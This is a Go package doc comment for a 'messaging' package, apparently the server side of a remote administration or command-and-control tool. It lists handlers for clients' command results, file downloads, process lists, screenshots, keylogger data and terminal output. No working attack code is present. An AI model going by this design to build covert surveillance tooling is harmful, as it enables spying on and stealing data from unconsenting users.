/*
Package messaging provides message routing and handling for client communications.

The messaging package defines interfaces and implementations for:
- Dispatcher: Routes messages to appropriate handlers based on message type
- Handler: Processes a specific message type and returns optional response
- ResultStore: Stores command results, file listings, screenshots, etc.
- ClientMetadataUpdater: Updates client metadata during message processing

Built-in handlers for standard message types:
- HeartbeatHandler: Processes heartbeat messages and updates client status
- CommandResultHandler: Processes command execution results
- FileListHandler: Processes file listing results
- DriveListHandler: Processes drive listing results
- ProcessListHandler: Processes process list results
- SystemInfoHandler: Processes system information results
- FileDataHandler: Processes file download data
- ScreenshotDataHandler: Processes screenshot data
- KeyloggerDataHandler: Processes keylogger data
- UpdateStatusHandler: Processes client update status
- TerminalOutputHandler: Processes terminal output from clients
- PongHandler: Processes pong responses to ping messages

Usage:
	dispatcher := messaging.NewDispatcher()
	dispatcher.Register(messaging.NewHeartbeatHandler(clientMgr))
	dispatcher.Register(messaging.NewCommandResultHandler(server))
	// ... register other handlers ...

	// Dispatch a message from a client
	response, err := dispatcher.Dispatch(clientID, message)
*/
package messaging
